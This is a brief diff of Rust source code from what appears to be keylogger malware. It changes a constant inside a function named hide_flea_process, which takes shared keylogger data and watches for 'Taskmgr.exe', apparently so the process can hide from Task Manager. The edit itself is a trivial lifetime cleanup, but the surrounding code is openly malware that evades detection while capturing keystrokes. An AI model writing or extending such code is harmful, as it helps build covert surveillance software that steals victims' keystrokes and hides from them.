@@ -13,7 +13,7 @@ pub fn hide_flea_process(key_logger_data: Arc<Mutex<Keylogger>>)
     }
 
     const WAIT_THREE_SECONDS: u64 = 3000;
-    const TASK_MANAGER_PROCESS_NAME: &'static str = "Taskmgr.exe";
+    const TASK_MANAGER_PROCESS_NAME: &str = "Taskmgr.exe";
 
     let sys = SystemCmd::new();
     let mut hidden: bool = false;
